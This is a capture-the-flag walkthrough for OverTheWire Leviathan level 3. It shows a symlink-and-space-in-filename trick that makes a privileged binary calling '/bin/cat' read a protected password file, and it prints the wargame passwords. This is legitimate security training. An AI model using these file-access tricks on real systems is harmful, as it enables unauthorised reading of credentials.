# 🐉 OverTheWire Leviathan CTF – Level 3  

## 🌐 **Challenge Description**  
Leviathan is a Linux-based wargame focused on basic Unix commands and privilege escalation.  
👉 Levels can be accessed via SSH on port **2223**.  

---

## 🎯 **Goal**  
- Exploit a symbolic link vulnerability to read the password for the next level.  

---

## 🌊 **Level 3 Details**  
| **Level** | **Username** | **Password** | **Command to Login** |
|:---------|:-------------|:------------|---------------------|
| Level 3  | leviathan2   | NsN1HwFoyN   | `ssh leviathan2@leviathan.labs.overthewire.org -p 2223` |

---

## 🚀 **Solution**  

### **Step 1: Connect to the Server**  
Use SSH to connect to the Leviathan server:  

```bash
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

- **Username:** `leviathan2`  
- **Password:** `NsN1HwFoyN`  

👉 SSH allows us to securely connect to the server using port **2223**.  

---

### **Step 2: List All Files**  
Once logged in, list all files (including hidden ones):  

```bash
ls -la
```

**Output Example:**

![ls-la](https://github.com/user-attachments/assets/9f28f3fc-4f69-476b-9e9d-feb9d0ed2baa)


We can see a file named **printfile** — this is most likely the key to solving the challenge.  

---

### **Step 3: Execute the Binary**  
Try running the `printfile` binary:  

```bash
./printfile
```

Output:
```bash
Usage: ./printfile <file_to_print>
```

The program expects a file as input.  

---

### **Step 4: Test with a File You Have Access To**  
Try printing a file that you have permission to read:  

```bash
./printfile .bash_logout
```

✅ **Explanation:**  
- The binary is using a command like `cat` internally to print the contents of the file.  

---

### **Step 5: Analyze the Binary Using `ltrace`**  
Use `ltrace` to see which system calls are being used:  

```bash
ltrace ./printfile .bash_logout
```

**Output Example:**

![ltrace](https://github.com/user-attachments/assets/eb4c6f1f-1215-413a-96d4-986a2f0efa03)


✅ **Explanation:**  
- `system("/bin/cat .bash_logout")` → Calls the `cat` command to display the file.  
- Since `cat` is called directly, we can try a **symlink attack** to trick the program into reading the password file.  

---

### **Step 6: Create a Symbolic Link**  
We will create a symlink to the password file:  

1. Create a directory in `/tmp`:
```bash
mktemp -d
```

2. Create a symbolic link to the target file:
```bash
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.LqMBlBFleI/test
```

👉 `ln -s` → Creates a symbolic link from `test` to `/etc/leviathan_pass/leviathan3`.  

3. List files to confirm the symlink:
```bash
ls -la /tmp/tmp.LqMBlBFleI/
```

4. Give full permissions to the directory:
```bash
chmod 777 /tmp/tmp.LqMBlBFleI/
```

---

### **Step 7: Bypass the Space Limitation**  
Create a fake filename with a space:  

```bash
touch "/tmp/tmp.LqMBlBFleI/test file.txt"
```

The program will try to read `file.txt`, but the actual file will be `test` (the symlink).  

---

### **Step 8: Execute the Binary with the Fake File**  
Run the binary and pass the fake filename:  

```bash
./printfile "/tmp/tmp.LqMBlBFleI/test file.txt"
```

**Output Example:**

![Password](https://github.com/user-attachments/assets/54331be1-f63f-499b-a9ae-f40ab648835f)


🎯 **Password extracted!**  

---

## ✅ **Password for Leviathan Level 3**  
```bash
f0n8h2iWLP
```

---

## 🖼️ **Screenshots**  
| Step | Screenshot |  
|------|------------|  
| Step 5 – Using `ltrace` | ![ltrace](https://github.com/user-attachments/assets/eb4c6f1f-1215-413a-96d4-986a2f0efa03) |  
| Step 8 – Symlink Attack | ![Password](https://github.com/user-attachments/assets/54331be1-f63f-499b-a9ae-f40ab648835f) |  

---

## 💡 **Lessons Learned**  
✔️ **Command Injection:** The binary calls `/bin/cat` without sanitizing input.  
✔️ **Symlink Attack:** Creating a symbolic link can trick the program into reading sensitive files.  
✔️ **Privilege Escalation:** Misconfigured file access can lead to information leaks.  

---

## 🎯 **Next Level**  
Use the password to access **Leviathan Level 4**:  
👉 [http://leviathan.labs.overthewire.org](http://leviathan.labs.overthewire.org)  

---
